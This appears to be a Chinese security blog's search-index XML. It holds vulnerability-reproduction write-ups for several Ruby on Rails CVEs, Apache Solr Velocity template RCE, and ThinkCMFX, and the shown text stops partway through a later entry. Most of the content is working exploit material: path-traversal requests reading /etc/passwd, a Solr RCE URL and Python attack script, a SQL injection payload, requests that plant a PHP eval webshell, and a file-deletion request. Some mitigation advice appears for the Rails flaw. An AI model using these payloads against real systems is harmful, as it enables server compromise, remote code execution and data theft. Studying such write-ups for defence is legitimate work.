<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Ruby on Rails漏洞</title>
      <link href="/2019/11/15/rubyonrails/"/>
      <url>/2019/11/15/rubyonrails/</url>
      
        <content type="html"><![CDATA[<p> Ruby on Rails是一种结合Ruby语言与Rails平台的一种网页程序框架，Ruby语言以自然、简洁、快速著称，全面支持<a href="https://zh.wikipedia.org/wiki/面向对象程序设计" target="_blank" rel="noopener">面向对象程序设计</a>，而Rails则是Ruby广泛应用方式之一，在Rails平台上设计出一套独特的<a href="https://zh.wikipedia.org/wiki/MVC" target="_blank" rel="noopener">MVC</a>开发架构，采取模型（Model）、视图（View）、控制器（Controller）分离的开发方式，不但减少了开发中的问题，更简化了许多繁复的动作。 </p><h4 id="Ruby-on-Rails-路径穿越与任意文件读取漏洞（CVE-2019-5418）"><a href="#Ruby-on-Rails-路径穿越与任意文件读取漏洞（CVE-2019-5418）" class="headerlink" title="Ruby on Rails 路径穿越与任意文件读取漏洞（CVE-2019-5418）"></a>Ruby on Rails 路径穿越与任意文件读取漏洞（CVE-2019-5418）</h4><blockquote><p>Fixed Versions:     6.0.0.beta3, 5.2.2.1, 5.1.6.2, 5.0.7.2, 4.2.11.1 </p></blockquote><p>在控制器中通过<code>render file</code>形式来渲染应用之外的视图，且会根据用户传入的Accept头来确定文件具体位置。我们通过传入<code>Accept: ../../../../../../../../etc/passwd&amp;#123;&amp;#123;</code>头来构成构造路径穿越漏洞，读取任意文件。</p><h5 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h5><p>执行如下命令编译及启动Rail On Rails 5.2.2：</p><pre><code>docker-compose builddocker-compose up -d</code></pre><p>环境启动后，访问<code>http://your-ip:3000</code>即可看到Ruby on Rails的欢迎页面。</p><h5 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>访问<code>http://your-ip:3000/robots</code>可见，正常的robots.txt文件被读取出来。</p><p>利用漏洞，发送如下数据包，读取<code>/etc/passwd</code>：</p><pre><code>GET /robots HTTP/1.1Host: your-ip:3000Accept-Encoding: gzip, deflateAccept: ../../../../../../../../etc/passwd{{Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: close</code></pre><p>成功读取：</p><p><img src="https://i.loli.net/2019/11/09/mxgi5pDY2CK7VPk.png" alt="image.png"></p><h4 id="Ruby-on-Rails任意文件读取-CVE-2018-3760"><a href="#Ruby-on-Rails任意文件读取-CVE-2018-3760" class="headerlink" title="Ruby on Rails任意文件读取(CVE-2018-3760)"></a>Ruby on Rails任意文件读取(CVE-2018-3760)</h4><p>Ruby On Rails在开发环境下使用Sprockets作为静态文件服务器，Ruby On Rails是著名Ruby Web开发框架，Sprockets是编译及分发静态资源文件的Ruby库。<br>Sprockets 3.7.1及之前版本中，存在一处因为二次解码导致的路径穿越漏洞，攻击者可以利用%252e%252e/来跨越到根目录，读取或执行目标服务器上任意文件。</p><p>直接访问<code>http://192.168.218.131:3000/assets/file:%2f%2f/etc/passwd</code>，将会报错，因为文件/etc/passwd不在允许的目录中：<br> <img src="https://i.loli.net/2019/11/09/kcaL4H7RXWrNq5w.png" alt="img"> </p><p>我们通过报错页面，可以获得允许的目录列表。随便选择其中一个目录，如/usr/src/blog/app/assets/images，然后使用%252e%252e/向上一层跳转，最后读取/etc/passwd：</p><pre><code>http://192.168.218.131:3000/assets/file:%2f%2f/usr/src/blog/app/assets/images/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd</code></pre><p><img src="https://i.loli.net/2019/11/09/DIC7r1WRhOAtHyE.png" alt="image.png"></p><h4 id="Ruby-on-Rails-动态渲染远程代码执行漏洞-CVE-2016-0752"><a href="#Ruby-on-Rails-动态渲染远程代码执行漏洞-CVE-2016-0752" class="headerlink" title="Ruby on Rails 动态渲染远程代码执行漏洞 (CVE-2016-0752)"></a>Ruby on Rails 动态渲染远程代码执行漏洞 (CVE-2016-0752)</h4><h5 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h5><hr><p>​    如果你的应用中使用了动态渲染路径 ( <code>dynamic render paths</code> ) ，如渲染<code>params[:id]</code>，通过本地文件包含（<code>local file inclusion</code>），可能会导致远程代码执行。可以通过更新到Rails的最新版本，或重构你的controllers来修复漏洞。</p><p>文章主要介绍了在特定的场景下，<code>Ruby on Rails</code> 框架的一个缺陷导致攻击者能够远程执行代码。</p><p>​    在 <code>Rails controllers</code> 的设计中，会根据被调用的方法，隐式的渲染对应的 <code>view</code> 文件。例如，当调用 <code>controller</code> 的 <code>show</code> 方法时，如果代码中没有明确指定要渲染的 <code>view file</code>，框架就会隐式的渲染 <code>show.html.erb</code> 文件。</p><p>​    然而在很多情况下，开发者会根据请求格式，如 <code>text, JSON, XML</code> 来明确渲染的内容。此时， <code>view file</code> 是一个模板语言文件，如 <code>ERB, HAML</code> 等。<code>Rails</code> 框架中有多个方法能够用于影响和改变 <code>view</code> 内容。本文中重点关注渲染方法（<code>render method</code>）。<code>Rails</code> 的文档中给出了多种调用渲染方法的方式，包括使用 <code>file:</code> 选项来明确指定要渲染的 <code>view file</code> 路径。</p><p>如果你阅读了该方法的<a href="http://guides.rubyonrails.org/layouts_and_rendering.html" target="_blank" rel="noopener">文档</a>，你会对功能的说明感到迷惑。让我们来看一段代码：</p><pre><code>def show  render params[:template]end</code></pre><p>第一眼看，这段代码非常简单，该 <code>controller action</code> 的主要功能为渲染 <code>template</code> 参数指定 view 模板。但Rails如何查找指定的模板呢？在 <code>views</code> 目录下查找？ 在应用的 root 目录下查找？或是在其他位置？；该参数的值是一个模板的名称？是一个有特定后缀的文件名？或是一个完整的文件路径？这里有许许多多的疑问，我们需要查看实现的细节才能够得到答案。</p><h5 id="0x01-细节说明"><a href="#0x01-细节说明" class="headerlink" title="0x01 细节说明"></a>0x01 细节说明</h5><hr><p>框架的渲染机制（<code>render mechanism</code>）是一个在单一函数内试图完成太多功能的例子，这也是导致远程代码执行的原因所在。</p><p>我们假定渲染机制的预期行为是渲染在 <code>app/views/user/#{params[:template]}</code> 文件，该假设看起来似乎是合理的。如果 <code>template</code> 参数的值为 <code>dashboard</code>，那么就会去加载 <code>app/views/user/dashboard.{ext}</code> 文件，其中 <code>.ext</code> 是任意允许的后缀类型，如 <code>.html, .haml, .html.erb</code> 等</p><p><img src="https://i.loli.net/2019/11/15/8KuhDLxjzFdHP4I.png" alt="image.png"></p><p>假设用户给出的 <code>template</code> 参数值为 <code>../admin/dashboard</code>。 程序执行的结果会是什么？ 如下图所示，执行后，程序抛出了缺少模板错误（<code>missing template error</code>）</p><p><img src="https://i.loli.net/2019/11/15/zMgcvGuDYsOneaU.png" alt="image.png"></p><p>通过分析报错信息，我们可以知道，框架试图在多个路径下查找要渲染的 <code>view file</code>，包括 <code>RAILS_ROOT/app/views</code>，<code>RAILS_ROOT</code> 和 文件系统的根目录。</p><p>从文件系统的根目录加载并渲染文件的行为是非常危险的。如果我们将 <code>/etc/passwd</code> 作为 <code>template</code> 参数的值传入，并且能够读取到 <code>passwd</code> 文件的内容。那么将会是一个很严重的问题。</p><p><img src="https://i.loli.net/2019/11/15/OA2ItnDrc9vwC3z.png" alt="image.png"></p><p>如果我们能够读取 <code>passwd</code> 文件的内容，那么也可以读取应用程序的源代码和配置文件，如 <code>config/initializers/secrettoken.rb</code> 文件。</p><p><img src="https://i.loli.net/2019/11/15/WlkqdOKoebQg39u.png" alt="image.png"></p><p>导致该问题的原因是，在应用中使用了动态渲染路径（<code>dynamic render paths</code>）</p><pre><code>def show  render params[:template]end</code></pre><p>这个简单的代码的例子证明了攻击者能够读取我们的源代码和应用程序配置文件。不幸的是，这不是最坏的结果。</p><p>如 <code>Jeff Jarmo</code> 在他的文章 <a href="http://matasano.com/research/AnatomyOfRailsVuln-CVE-2014-0130.pdf" target="_blank" rel="noopener">The Anatomy of a Rails Vulnerability – CVE-2014-0130: From Directory Traversal to Shell</a> 中描述的，我们能够利用这个漏洞获得一个shell。<code>Jeff</code> 的文章中描述了 在某些版本的Rails的 隐式渲染机制的一个相似漏洞，能够允许目录遍历（<code>directory traversal</code>），更精确的说，本地文件包含（<code>local file inclusion</code>）。本文中重点关注显示渲染（<code>explicit rendering</code>），这是一个由框架开发者所引入的漏洞。</p><p>在进入细节分析前，这里将该漏洞的分类归为文件包含而不是目录遍历，原因是我们将文件作为代码（<code>ERB</code>）进行加载、解释并执行。从传统意义上来说，目录遍历漏洞返回的是不可执行的（<code>non-executable</code>）的内容，如 <code>CSV</code> 文件。因此从本质来说，我们不仅仅能够读取应用程序的源代码和其他可读的系统文件，还能够执行 <code>Ruby</code> 代码。既然我们能够执行 <code>Ruby</code> 代码，我们也能够在 <code>web server</code> 上执行系统级别（<code>system-level</code>）的命令。</p><p>在从文件包含到得到 <code>shell</code> 的过程中，用到了一种关键的技术，称为 日志文件污染 (<code>log file tainting</code>)。<code>Rails</code> 在运行过程中，会将请求信息记录到日志文件中，包括请求参数，如 <code>development.log</code> 。日志文件是纯文本格式，能够包含 <code>Ruby</code> 代码。日志文件污染可以通过向 <code>web</code> 应用程序发送一个恶意的请求，请求的参数中包含有效的 <code>Ruby</code> 代码来实现。</p><p>在下面的例子中，我们向<code>web</code> 应用程序发起了一个合法的请求，但在 <code>URL</code> 中带上了包含恶意的、经过 <code>URL</code> 编码的参数 &lt;%= `ls` %&gt;。</p><p><img src="https://i.loli.net/2019/11/15/GZ7mrkiT9XfpCMq.png" alt="image.png"></p><p>通过查看日志文件，我们可以看到，日志中请求参数是以 <code>hash</code> 键值对的方式保存，并进行了 URL解码。这是有效的 <code>Ruby</code> 代码，能够在文件被渲染时执行。</p><p><img src="https://i.loli.net/2019/11/15/RVqOvXLljgkrBta.png" alt="image.png"></p><p>因此，我们能够利用文件包含漏洞来尝试加载日志文件，执行包含的 <code>Ruby</code> 代码。</p><p><img src="https://i.loli.net/2019/11/15/RSKtzFOCLlXQd6w.png" alt="image.png"></p><p>当日志文件返回时，我们能够看到参数的 <code>hash</code> 值。之前包含我们 <code>payload</code> 的部分已经被 <code>ls</code> 命令的执行结果所替换。到这里，我们已经能够以 <code>web-server</code> 对应用户权限来执行系统命令了。</p><h5 id="0x02-修复方法-amp-缓解措施"><a href="#0x02-修复方法-amp-缓解措施" class="headerlink" title="0x02 修复方法 &amp; 缓解措施"></a>0x02 修复方法 &amp; 缓解措施</h5><hr><p>安装 <code>Rails</code> 特定版本的 <a href="https://groups.google.com/forum/#!topic/rubyonrails-security/335P1DcLG00" target="_blank" rel="noopener">补丁</a></p><p>如果还没有安装 <code>patch</code>，可以考虑禁止渲染白名单之外的文件。具体方法为，在 <code>action</code> 中定义允许的文件名白名单 <code>hash</code>，对用户的参数进行校验，确保参数在文件白名单 <code>hash</code> 中。这种方法需要在应用程序中所有使用到动态渲染路径的地方都增加校验。</p><pre><code>def show  template = params[:id]  valid_templates = {    &quot;dashboard&quot; =&gt; &quot;dashboard&quot;,    &quot;profile&quot;   =&gt; &quot;profile&quot;,    &quot;deals&quot;   =&gt; &quot;deals&quot;  }  if valid_templates.include?(template)    render &quot; #{valid_templates[template]}&quot;  else    # throw exception or 404  endend</code></pre><p>另一种类似的方法为校验给定的文件是否在特定的目录下存在。</p><pre><code>def show  template = params[:id]  d = Dir[&quot;myfolder/*.erb&quot;]  if d.include?(&quot;myfolder/#{template}.erb&quot;)    render &quot;myfolder/#{template}&quot;  else    # throw exception or 404  endend</code></pre><p>此外，我们可以使用 <code>Rails</code> 静态分析工具 <a href="http://brakemanscanner.org/" target="_blank" rel="noopener">Brakeman</a>来扫描应用程序。<code>Brakeman</code> 检测报告会给出使用了动态渲染路径的 <code>controllers</code>，可以根据此来分析哪些 <code>controllers</code> 会有远程代码执行的风险。</p><p>Referer</p><p><a href="https://nvisium.com/blog/2016/01/26/rails-dynamic-render-to-rce-cve-2016-0752/" target="_blank" rel="noopener">https://nvisium.com/blog/2016/01/26/rails-dynamic-render-to-rce-cve-2016-0752/</a></p><p><a href="https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf" target="_blank" rel="noopener">https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf</a></p><p><a href="https://groups.google.com/forum/#!topic/rubyonrails-security/pFRKI96Sm8Q" target="_blank" rel="noopener">https://groups.google.com/forum/#!topic/rubyonrails-security/pFRKI96Sm8Q</a></p><p><a href="https://xz.aliyun.com/t/4448" target="_blank" rel="noopener">https://xz.aliyun.com/t/4448</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ahache Solr velocity模板命令执行漏洞</title>
      <link href="/2019/11/01/solr/"/>
      <url>/2019/11/01/solr/</url>
      
        <content type="html"><![CDATA[<h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><p> Apache Solr 5.x &lt;= 8.2.0 </p><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>到<a href="https://www.apache.org/dyn/closer.lua/lucene/solr/8.2.0/solr-8.2.0.zip" target="_blank" rel="noopener">Ahache Solr官网</a>下载最新版本8.2.0,解压到当前目录。</p><p><img src="https://i.loli.net/2019/11/02/qNprUEXa5zhCbRZ.png" alt="朋与厌"></p><p>进入到<code>solr-8.2.0/bin/</code> 目录运行Solr服务。</p><p><strong>./solr start -e cloud -force</strong>   ……..一路回车……</p><p><img src="https://i.loli.net/2019/11/02/Xqpc8NnJ1b5Fzh4.png" alt="朋与厌"></p><p><img src="https://i.loli.net/2019/11/02/QBzjDcEJr2VtkwN.png" alt="朋与厌"></p><p>SolrCloud example running, please visit: <a href="http://localhost:8983/solr" target="_blank" rel="noopener">http://localhost:8983/solr</a> </p><p><img src="https://i.loli.net/2019/11/02/sA3xJaO5yDvtEM2.png" alt="朋与厌"></p><p>Collections默认创建一个节点基本能够确认搭建完成了。</p><h4 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析"></a>原因分析</h4><p> Apache Solr默认集成<code>VelocityResponseWriter</code>插件，在该插件的初始化参数中的<code>params.resource.loader.enabled</code>这个选项是用来控制是否允许参数资源加载器在Solr请求参数中指定模版，默认设置是false。 </p><p><img src="https://i.loli.net/2019/11/02/f3iDKFnjVwXH5vh.png" alt="朋与厌"></p><p> 当设置<code>params.resource.loader.enabled</code>为true时，将允许用户通过设置请求中的参数来指定相关资源的加载，攻击者可以通过构造一个具有恶意攻击数据包，修改配置文件。导致在服务器上进行命令执行。 </p><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>首先需要创建一个全新的<strong>Collection</strong> 命名为test。抓取数据包（后面会有需要用到）</p><p><img src="https://i.loli.net/2019/11/02/IJ41vnU7NbGQRh8.png" alt="朋与厌"></p><p>刷新浏览器可以看到一个test的项目。</p><p><img src="https://i.loli.net/2019/11/02/kNcmb3lwEKe8zvV.png" alt="朋与厌"></p><p>构造修改<strong>配置文件</strong>数据包</p><pre class="line-numbers language-http"><code class="language-http"><span class="token request-line"><span class="token property">POST</span> http://192.168.0.154<span class="token attr-name">:8983</span>/solr/test/config HTTP/1.1</span><span class="token header-name keyword">Host:</span> 192.168.0.154:8983<span class="token header-name keyword">Connection:</span> close<span class="token header-name keyword">Accept-Encoding:</span> gzip, deflate<span class="token header-name keyword">Accept:</span> */*<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0<span class="token header-name keyword">Content-Length:</span> 250{  "update-queryresponsewriter": {    "startup": "lazy",    "name": "velocity",    "class": "solr.VelocityResponseWriter",    "template.base.dir": "",    "solr.resource.loader.enabled": "true",    "params.resource.loader.enabled": "true"  }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/02/mUcHdnxjbqDKyA2.png" alt="朋与厌"></p><p>命令执行</p><pre class="line-numbers language-html"><code class="language-html">http://192.168.0.154:8983/solr/test/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+%5B1..$out.available()%5D)$str.valueOf($chr.toChars($out.read()))%23end<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/02/UXgFYxEIpdteLzf.png" alt="Rec"></p><h5 id="Python脚本"><a href="#Python脚本" class="headerlink" title="Python脚本"></a>Python脚本</h5><pre><code>#!/usr/bin/env python# _*_ coding: utf-8 _*_import requestsimport urlparsedef SorlAttck(url):    Create_node = url+&quot;/solr/admin/collections?_=1572507517815&amp;action=CREATE&amp;autoAddReplicas=false&amp;collection.configName=_default&amp;maxShardsPerNode=1&amp;name=test&amp;numShards=1&amp;replicationFactor=1&amp;router.name=compositeId&amp;wt=json&quot;    # //刚才抓取的创建新的节点数据包    Config = url+&quot;/solr/test/config&quot;    Config_data = &quot;&quot;&quot;{  &quot;update-queryresponsewriter&quot;: {    &quot;startup&quot;: &quot;lazy&quot;,    &quot;name&quot;: &quot;velocity&quot;,    &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;,    &quot;template.base.dir&quot;: &quot;&quot;,    &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;,    &quot;params.resource.loader.enabled&quot;: &quot;true&quot;  }}&quot;&quot;&quot;    Poc = url+&quot;/solr/test/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end&quot;    try:        requests.get(Create_node)        #// 首先创建为test的节点        requests.post(Config,data=Config_data)        #// 修改test的配置信息        Response = requests.get(Poc)        #// 发送命令执行数据包        if Response.status_code == 200 and &#39;uid=&#39; in Response.text and &#39;gid=&#39; in Response.text and &#39;groups=&#39; in Response.text:            warning_info = u&#39;[+] {} 存在Apache Solr Velocity模板远程代码执行漏洞\r\n漏洞地址:{}\r\n漏洞详情:\r\n{}&#39;.format(url, Poc, Response.text)            print(warning_info)        else:            print(&quot;[-] {} Does not exist&quot;.format(url))    except Exception as e:        passif __name__ == &#39;__main__&#39;:    url = &#39;http://192.168.218.131:8983&#39;    SorlAttck(url)</code></pre><p><img src="https://i.loli.net/2019/11/02/hPQOA4useIx7HEv.png" alt="Payload"></p><h3 id="Reference："><a href="#Reference：" class="headerlink" title="Reference："></a>Reference：</h3><p> <a href="https://lucene.apache.org/solr/" target="_blank" rel="noopener">https://lucene.apache.org/solr/</a> </p><p> <a href="https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt" target="_blank" rel="noopener">https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt</a> </p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThinkCMFX 漏洞分析集合</title>
      <link href="/2019/11/01/thinkcmfx/"/>
      <url>/2019/11/01/thinkcmfx/</url>
      
        <content type="html"><![CDATA[<h3 id="ThinkCMFX-漏洞分析集合"><a href="#ThinkCMFX-漏洞分析集合" class="headerlink" title="ThinkCMFX 漏洞分析集合"></a>ThinkCMFX 漏洞分析集合</h3><p>ThinkCMF是一款基于ThinkPHP+MySQL开发的中文内容管理框架。ThinkCMF提出灵活的应用机制，框架自身提供基础的管理功能，而开发者可以根据自身的需求以应用的形式进行扩展。每个应用都能独立的完成自己的任务，也可通过系统调用其他应用进行协同工作。在这种运行机制下，开发商场应用的用户无需关心开发SNS应用时如何工作的，但他们之间又可通过系统本身进行协调，大大的降低了开发成本和沟通成本。 </p><p><img src="https://i.loli.net/2019/11/02/62kNoDjaQJcpP4R.png" alt="image-20191029112026949.png"></p><p>​    ThinkCMF 有两个版本 V版本和X版本  ThinkCMF V 基于ThinkPHP3 开发官方已经不再维护。 本文将对 <strong>ThinkCMFX</strong>  <strong>2.2.3</strong> 进行漏洞总结分析。 <strong>ThinkCMFX2.2.3</strong> 下载地址： <a href="https://github.com/thinkcmf/" target="_blank" rel="noopener">https://github.com/thinkcmf/</a> </p><h3 id="0x00-前台-文章编辑SQL注入"><a href="#0x00-前台-文章编辑SQL注入" class="headerlink" title="0x00 前台 文章编辑SQL注入"></a>0x00 前台 文章编辑SQL注入</h3><blockquote><p>在 <strong>ThinkCMFX2.2.3</strong> 版本中，存在一处SQL注入（需要普通用户权限，默认可注册），触发截图如下。 </p></blockquote><p><img src="https://i.loli.net/2019/11/02/Tm9HoCBVli5yqEf.png" alt="image-20191029113404364.png"></p><pre class="line-numbers language-http"><code class="language-http">POST /ThinkCMFX/index.php?g=portal&amp;m=article&amp;a=edit_post HTTP/1.1<span class="token header-name keyword">Host:</span> localhost<span class="token header-name keyword">Connection:</span> close<span class="token header-name keyword">Cookie:</span> PHPSESSID=kcg5v82ms3v13o8pgrhh9saj95<span class="token header-name keyword">Content-Type:</span> application/x-www-form-urlencoded<span class="token header-name keyword">Content-Length:</span> 79post[id][0]=bind&amp;post[id][1]=0 and updatexml(1, concat(0x7e,user(),0x7e),1)--+-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 因为其他代码中对于 <strong>id</strong> 的获取写法都是类似 <strong>I(‘get.id’,0,’intval’)</strong> 。用 <strong>intval</strong> 函数进行强转，而这里明显像是忘记了。可控变量 <strong>$article[‘id’]</strong> 来自 <strong>POST</strong> ，未经过滤直接作为 <strong>where</strong> 条件进行查询，最终导致 <strong>SQL注入漏洞</strong> 。</p><p><img src="https://i.loli.net/2019/11/02/O8ad2Yot41TyzrJ.png" alt="image-20191029115949352.png"></p><p> 如下图所示，框架底层将数据进行了拼接 </p><p><img src="https://i.loli.net/2019/11/02/wqOx3RjT8V6dCkr.png" alt="image-20191029120131697.png"></p><h3 id="0x01-前台-Comment、-Api-类模版引擎注入演示"><a href="#0x01-前台-Comment、-Api-类模版引擎注入演示" class="headerlink" title="0x01 前台 Comment、 Api 类模版引擎注入演示"></a>0x01 前台 Comment、 Api 类模版引擎注入演示</h3><blockquote><p>在 <strong>ThinkCMFX2.2.3</strong> 最终版中， 存在2处前台代码执行 发送如下数据包后，会在网站根目录生成一个名为 <strong>test.php</strong> 的 <strong>webshell</strong> 。（该漏洞仅能在 <strong>Windows</strong> 下触发） </p></blockquote><p><strong>Comment</strong></p><pre class="line-numbers language-http"><code class="language-http"><span class="token request-line"><span class="token property">POST</span> http://192.168.0.112/ThinkCMFX/index.php?g=Comment&amp;m=Widget&amp;a=fetch HTTP/1.1</span><span class="token header-name keyword">Host:</span> 192.168.0.112<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0<span class="token header-name keyword">Accept:</span> text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<span class="token header-name keyword">Content-Type:</span> application/x-www-form-urlencoded<span class="token header-name keyword">Cache-Control:</span> max-age=0<span class="token header-name keyword">Content-Length:</span> 117templateFile=/../public/index&amp;prefix=''&amp;content=&lt;php>file_put_contents('test.php','&lt;?php eval($_REQUEST[11]);')&lt;/php><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>Api</strong></p><pre class="line-numbers language-http"><code class="language-http"><span class="token request-line"><span class="token property">POST</span> http://192.168.0.112/ThinkCMFX/index.php?g=Api&amp;m=Plugin&amp;a=fetch HTTP/1.1</span><span class="token header-name keyword">Host:</span> 192.168.0.112<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0<span class="token header-name keyword">Accept:</span> text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<span class="token header-name keyword">Content-Type:</span> application/x-www-form-urlencoded<span class="token header-name keyword">Cache-Control:</span> max-age=0<span class="token header-name keyword">Content-Length:</span> 121templateFile=/../../../public/index&amp;content=&lt;%3fphp+file_put_contents('test.php','&lt;%3fphp+eval($_POST[_])%3b');?>&amp;prefix=<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/02/5fb8uTNOY3CIWwc.png" alt="image-20191029135650753.png"><br>     这个漏洞的主要成因是：程序未对模板文件名进行过滤，且接口权限控制不严。在模板名可控、文件内容可控的情况下，content 输入了php代码所以他会在本地跟路径创建一个一句话木马test.php,该漏洞仅能在 <strong>Windows</strong> 下触发。</p><p><img src="https://i.loli.net/2019/11/02/MDiN31uPosmKE8q.png" alt="image-20191029134814194.png"><br> 在下图第68行处，会对模板文件 <strong>$templateFile</strong> 是否存在进行一个判断，如果不存在就会报错退出。而在此之前第67行，会在模板名前面拼接一个路径，但是我们却可以使用 <strong>../</strong> 字符来控制这个 <strong>$templateFile</strong> ，使其绕过文件是否存在的判断。</p><p>（下图对应文件位置：<code>application/Comment/Controller/WidgetController.class.php</code>） </p><p><img src="https://i.loli.net/2019/11/02/hVvHrqZ5aDTBdRf.png" alt="image-20191029134943603.png"><br> 因为我们是直接通过路由访问到这个接口的，所以此时 <strong>$templateFile</strong> 变量的值为 <strong>THEME_PATHComment/../public/index.html</strong> ，而程序本意肯定是定义了 <strong>THEME_PATH</strong> </p><p> <strong>THEME_PATHComment</strong> 这个目录肯定是不存在的，而在 <strong>Windows</strong> 下允许 <strong>不存在目录/../public/index.html</strong> ， <strong>Linux</strong> 下是不行的，所以这个漏洞只能在 <strong>Windows</strong> 下利用。 </p><p> 当缓存文件不存在时，程序会将我们传入的内容写进缓存文件 </p><p><img src="https://i.loli.net/2019/11/02/WXdvU9VwbOPsn6D.png" alt="image-20191029135231346.png"></p><p><img src="https://i.loli.net/2019/11/02/3EwUzjJWGT6dq2B.png" alt="image-20191029135310475.png"><br> 之后再包含这个缓存文件，最终导致代码执行。 </p><p><img src="https://i.loli.net/2019/11/02/TIuZ2FXNw967YcR.png" alt="image-20191029135332417.png"></p><p>随后访问<code>http://192.168.0.112/ThinkCMFX/test.php</code> 就是刚才写入的Webshell</p><h3 id="0x02-上传头像处任意文件删除"><a href="#0x02-上传头像处任意文件删除" class="headerlink" title="0x02  上传头像处任意文件删除"></a>0x02  上传头像处任意文件删除</h3><p>1</p><blockquote><p>在用户上传头像处存在任意文件删除漏洞，发送如下数据包后，会删除网站根目录下一个名为 <strong>P1Kaju.txt</strong> 的文件。（该漏洞仅能在 <strong>Windows</strong> 下触发） </p></blockquote><pre class="line-numbers language-http"><code class="language-http">POST /ThinkCMFX/index.php?g=User&amp;m=Profile&amp;a=do_avatar HTTP/1.1<span class="token header-name keyword">Host:</span> 192.168.0.112<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20081302 Firefox/50.0<span class="token header-name keyword">Content-Type:</span> application/x-www-form-urlencoded<span class="token header-name keyword">Content-Length:</span> 29mgurl=..\..\..\..\..\P1Kaju.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 每次上传头像后， <strong>ThinkCMFX2.2.3</strong> 将新的头像地址写入数据库，并将先前的头像删除。程序这里对符号 <strong>/</strong> 进行了过滤，就是为了防止路径穿越问题。然而在 <strong>Windows</strong> 下，却允许 <strong>....\头像文件</strong> 这种写法，所以也是为什么这个漏洞仅在 <strong>Windows</strong> 下可利用。（下图对应文件位置：<code>application/User/Controller/ProfileController.class.php</code>） </p><p><img src="https://i.loli.net/2019/11/02/2wdrSMG13NEF9Ut.png" alt="image-20191029140937636.png"></p><p> 从文件可以看到 <code>$imgurl=str_replace(&#39;/&#39;,&#39;&#39;,$imgurl);</code> 过滤了 / 但是没有过滤 所以我们无法引入 / 并且在更新头像以后还会从前端接收参数 imgurl 带入函数<code>sp_delete_avatar</code> 跟进去 </p><h3 id="0x03-分类管理模板注入-CVE-2019-7580-需要admin权限）"><a href="#0x03-分类管理模板注入-CVE-2019-7580-需要admin权限）" class="headerlink" title="0x03 分类管理模板注入 (CVE-2019-7580 需要admin权限）"></a>0x03 分类管理模板注入 <em><em>(CVE-2019-7580 </em></em>需要admin权限）</h3><blockquote><p>在 